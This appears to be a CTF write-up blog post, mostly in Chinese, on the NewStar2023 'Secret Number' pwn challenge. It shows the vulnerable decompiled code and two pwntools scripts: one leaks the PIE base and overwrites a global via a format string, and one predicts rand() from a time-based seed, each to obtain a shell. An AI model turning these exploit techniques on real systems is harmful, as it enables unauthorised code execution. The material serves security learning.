---
title: PIE Format String
tags: [ctf-pwn]
date: 2023-11-26 12:08:00
categories: [ctf-pwn]
excerpt: 开PIE的格式化字符串
---

### NewStar2023 Secret Number

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v5; // [rsp+8h] [rbp-38h] BYREF
  int v6; // [rsp+Ch] [rbp-34h] BYREF
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v3 = time(0LL);
  srand(v3);
  secret = rand();
  puts("Welcome to NewStar CTF!!");
  while ( 1 )
  {
    puts("Give me some gift?(0/1)");
    __isoc99_scanf("%d", &v6);
    if ( v6 != 1 )
      break;
    puts("What's it");
    read(0, buf, 32uLL);
    puts("Oh thanks,There is my gift:");
    printf(buf);
  }
  puts("Guess the number");
  __isoc99_scanf("%d", &v5);
  if ( v5 == secret )
    system("/bin/sh");
  else
    puts("You are wrong!");
  return 0;
}
```

#### 泄露PIE偏移

泄露栈里的main函数的地址，但是输入最多32字节，靠%p%p%p%p....是达不到第十七个%p的。

不知道有什么别的方法，只能一个一个试

pwntools的`fmtstr_payload`可以直接指定修改任意地址的值，第一个参数是`aaaaaaaa`的偏移，后面的字典是要修改的地址和值

```python
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
#p = remote("node4.buuoj.cn",26261)
p = process('./secretnumber')

offset=8 # aaaaaaaa
num_addr = 0x404c

##leak pie
p.sendlineafter(b"(0/1)\n",b'1')
payload = "aaaaaaaa%17$p".encode("utf-8")
p.sendlineafter(b"What's it\n",payload)
p.recvuntil(b'aaaaaaaa')
main_addr=int(p.recvuntil(b'f5')[-12:],16)
pie=main_addr-0x12F5
print(hex(main_addr))
print(hex(pie))
num_addr += pie

##fmtpayload
p.sendlineafter("(0/1)\n",'1')
fmtpayload=fmtstr_payload(offset, {num_addr:1})
p.sendlineafter("What's it\n",fmtpayload)
p.sendlineafter("(0/1)\n",'0')
p.sendlineafter("Guess the number\n",'1')
p.interactive()

```



#### 用相同的种子猜测伪随机数

不一定每次成功，要多试几次，让seed对上

```python
from pwn import *
from ctypes import *
context(os='linux', arch='amd64', log_level='debug')
p = remote('node4.buuoj.cn',26261)
elf = ELF('./secretnumber')
libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
 
seed=libc.time(0)
libc.srand(seed)
num1=libc.rand()
 
p.sendlineafter(b'Give me some gift?(0/1)\n',b'0')
p.sendlineafter(b'Guess the number\n',str(num1))
p.interactive()
```

